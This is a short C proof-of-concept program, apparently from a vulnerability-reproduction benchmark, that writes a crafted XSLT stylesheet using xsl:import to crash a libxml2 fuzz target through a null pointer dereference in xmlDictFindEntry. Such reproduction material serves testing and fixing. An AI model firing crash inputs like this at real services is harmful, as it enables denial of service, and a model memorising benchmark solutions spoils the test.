#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:62886 */
/* Triggers: null pointer dereference in xmlDictFindEntry via subdict->table */
/* Vuln class: null_pointer_dereference */
/* Target: /out/xpath - input is a single XML/XSLT document */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    /* Write a single valid XSLT stylesheet that triggers xmlDictCreateSub via import */
    const char *xslt = 
        "<?xml version=\"1.0\"?>"
        "<xsl:stylesheet version=\"1.0\""
        " xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
        "<xsl:import href=\"dummy\"/>"
        "<xsl:template match=\"/\"/>"
        "</xsl:stylesheet>";
    fwrite(xslt, 1, strlen(xslt), f);
    
    fclose(f);
    return 0;
}